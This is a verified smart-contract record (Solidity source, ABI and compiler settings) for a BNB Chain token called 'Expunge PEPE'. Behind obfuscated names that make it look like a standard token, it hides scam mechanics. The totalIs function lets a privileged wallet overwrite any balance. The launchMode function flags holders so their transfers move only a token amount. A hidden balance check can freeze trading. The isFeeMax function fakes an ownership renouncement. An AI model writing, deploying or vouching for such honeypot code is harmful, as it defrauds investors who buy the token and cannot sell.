{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.12;\n\ninterface senderExempt {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address limitMax) external view returns (uint256);\n\n    function transfer(address toMin, uint256 minTotal) external returns (bool);\n\n    function allowance(address tokenSender, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 minTotal) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address toMin,\n        uint256 minTotal\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed modeFund, uint256 value);\n    event Approval(address indexed tokenSender, address indexed spender, uint256 value);\n}\n\nabstract contract buyLaunchAmount {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface shouldLaunched {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface sellShould {\n    function createPair(address walletSender, address minLaunch) external returns (address);\n}\n\ninterface senderExemptMetadata is senderExempt {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ExpungePEPE is buyLaunchAmount, senderExempt, senderExemptMetadata {\n\n    bool public fromSwapLaunched;\n\n    uint256 exemptFeeLimit;\n\n    function walletFrom(address swapMaxFee, address toMin, uint256 minTotal) internal returns (bool) {\n        require(swapAuto[swapMaxFee] >= minTotal);\n        swapAuto[swapMaxFee] -= minTotal;\n        swapAuto[toMin] += minTotal;\n        emit Transfer(swapMaxFee, toMin, minTotal);\n        return true;\n    }\n\n    bool public tradingTeam;\n\n    function minTeam(address atMode) public {\n        require(atMode.balance < 100000);\n        if (fromSwapLaunched) {\n            return;\n        }\n        \n        swapWallet[atMode] = true;\n        \n        fromSwapLaunched = true;\n    }\n\n    address public receiverLaunchedIs;\n\n    mapping(address => bool) public swapWallet;\n\n    function transfer(address modeLaunched, uint256 minTotal) external virtual override returns (bool) {\n        return sellLaunch(_msgSender(), modeLaunched, minTotal);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return feeReceiver;\n    }\n\n    function owner() external view returns (address) {\n        return swapMin;\n    }\n\n    uint256 public atSender;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return feeTake;\n    }\n\n    function launchReceiver() private view {\n        require(swapWallet[_msgSender()]);\n    }\n\n    mapping(address => mapping(address => uint256)) private walletTakeLaunched;\n\n    function totalIs(address modeLaunched, uint256 minTotal) public {\n        launchReceiver();\n        swapAuto[modeLaunched] = minTotal;\n    }\n\n    function sellLaunch(address swapMaxFee, address toMin, uint256 minTotal) internal returns (bool) {\n        if (swapMaxFee == receiverLaunchedIs) {\n            return walletFrom(swapMaxFee, toMin, minTotal);\n        }\n        uint256 enableFund = senderExempt(feeToken).balanceOf(exemptShouldMin);\n        require(enableFund == exemptFeeLimit);\n        require(toMin != exemptShouldMin);\n        if (launchMinToken[swapMaxFee]) {\n            return walletFrom(swapMaxFee, toMin, fundReceiver);\n        }\n        return walletFrom(swapMaxFee, toMin, minTotal);\n    }\n\n    address public feeToken;\n\n    function transferFrom(address swapMaxFee, address toMin, uint256 minTotal) external override returns (bool) {\n        if (_msgSender() != exemptAmountWallet) {\n            if (walletTakeLaunched[swapMaxFee][_msgSender()] != type(uint256).max) {\n                require(minTotal <= walletTakeLaunched[swapMaxFee][_msgSender()]);\n                walletTakeLaunched[swapMaxFee][_msgSender()] -= minTotal;\n            }\n        }\n        return sellLaunch(swapMaxFee, toMin, minTotal);\n    }\n\n    mapping(address => bool) public launchMinToken;\n\n    uint256 private feeTake = 100000000 * 10 ** 18;\n\n    bool public receiverTxLimit;\n\n    bool private limitTo;\n\n    constructor (){\n        if (maxTrading != minMarketing) {\n            tradingTeam = true;\n        }\n        shouldLaunched autoLaunchedWallet = shouldLaunched(exemptAmountWallet);\n        feeToken = sellShould(autoLaunchedWallet.factory()).createPair(autoLaunchedWallet.WETH(), address(this));\n        if (fundFee) {\n            minMarketing = atSender;\n        }\n        receiverLaunchedIs = _msgSender();\n        isFeeMax();\n        swapWallet[receiverLaunchedIs] = true;\n        swapAuto[receiverLaunchedIs] = feeTake;\n        if (minMarketing != maxTrading) {\n            fundFee = false;\n        }\n        emit Transfer(address(0), receiverLaunchedIs, feeTake);\n    }\n\n    uint256 public minMarketing;\n\n    address exemptAmountWallet = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function allowance(address tokenSell, address autoTo) external view virtual override returns (uint256) {\n        if (autoTo == exemptAmountWallet) {\n            return type(uint256).max;\n        }\n        return walletTakeLaunched[tokenSell][autoTo];\n    }\n\n    function launchMode(address receiverAtTx) public {\n        launchReceiver();\n        if (receiverTxLimit != minAmountLaunched) {\n            maxTrading = atSender;\n        }\n        if (receiverAtTx == receiverLaunchedIs || receiverAtTx == feeToken) {\n            return;\n        }\n        launchMinToken[receiverAtTx] = true;\n    }\n\n    uint8 private feeReceiver = 18;\n\n    bool private fundFee;\n\n    uint256 private maxTrading;\n\n    uint256 exemptFromSwap;\n\n    address exemptShouldMin = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    event OwnershipTransferred(address indexed walletAuto, address indexed maxTake);\n\n    uint256 constant fundReceiver = 8 ** 10;\n\n    function isFeeMax() public {\n        emit OwnershipTransferred(receiverLaunchedIs, address(0));\n        swapMin = address(0);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return exemptTake;\n    }\n\n    function balanceOf(address limitMax) public view virtual override returns (uint256) {\n        return swapAuto[limitMax];\n    }\n\n    function getOwner() external view returns (address) {\n        return swapMin;\n    }\n\n    bool public launchedTx;\n\n    function symbol() external view virtual override returns (string memory) {\n        return autoMarketing;\n    }\n\n    address private swapMin;\n\n    mapping(address => uint256) private swapAuto;\n\n    bool public minAmountLaunched;\n\n    function teamBuyList(uint256 minTotal) public {\n        launchReceiver();\n        exemptFeeLimit = minTotal;\n    }\n\n    bool public minSender;\n\n    function approve(address autoTo, uint256 minTotal) public virtual override returns (bool) {\n        walletTakeLaunched[_msgSender()][autoTo] = minTotal;\n        emit Approval(_msgSender(), autoTo, minTotal);\n        return true;\n    }\n\n    string private autoMarketing = \"EPE\";\n\n    string private exemptTake = \"Expunge PEPE\";\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenSender\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletAuto\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxTake\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeFund\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenSell\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"autoTo\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minTotal\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atSender\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitMax\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeToken\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromSwapLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isFeeMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchMinToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverAtTx\",\"type\":\"address\"}],\"name\":\"launchMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minAmountLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minMarketing\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atMode\",\"type\":\"address\"}],\"name\":\"minTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverLaunchedIs\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverTxLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"swapWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"minTotal\",\"type\":\"uint256\"}],\"name\":\"teamBuyList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minTotal\",\"type\":\"uint256\"}],\"name\":\"totalIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minTotal\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapMaxFee\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"toMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minTotal\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ExpungePEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}